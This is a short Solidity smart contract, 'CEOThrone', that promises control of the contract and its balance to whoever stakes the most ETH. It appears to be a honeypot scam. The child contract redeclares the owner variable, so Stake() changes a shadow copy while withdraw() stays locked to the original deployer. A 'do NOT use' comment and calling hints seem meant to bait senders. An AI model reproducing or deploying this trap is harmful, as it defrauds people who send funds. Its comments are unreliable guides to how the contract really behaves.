1 pragma solidity ^0.4.19;
2 //
3 //Live TEST ---- Please Do NOT use! Thanks! ----
4 //
5 contract Ownable {
6     address public owner;
7     function Ownable() public {owner = msg.sender;}
8     modifier onlyOwner() {require(msg.sender == owner); _;
9     }
10 }
11 //CEO Throne .. The CEO with the highest stake gets the control over the contract
12 //msg.value needs to be higher than largestStake when calling Stake()
13 
14 contract CEOThrone is Ownable {
15     address public owner;
16     uint public largestStake;
17 // Stake() function being called with 0xde20bc92 and ETH :: recommended gas limit 35.000
18 // The sent ETH is checked against largestStake
19     function Stake() public payable {
20         // if you own the largest stake in a company, you own a company
21         if (msg.value > largestStake) {
22             owner = msg.sender;
23             largestStake = msg.value;
24         }
25     }
26 // withdraw() function being called with 0x3ccfd60b :: recommened gas limit 30.000
27     function withdraw() public onlyOwner {
28         // only owner can withdraw funds
29         msg.sender.transfer(this.balance);
30     }
31 }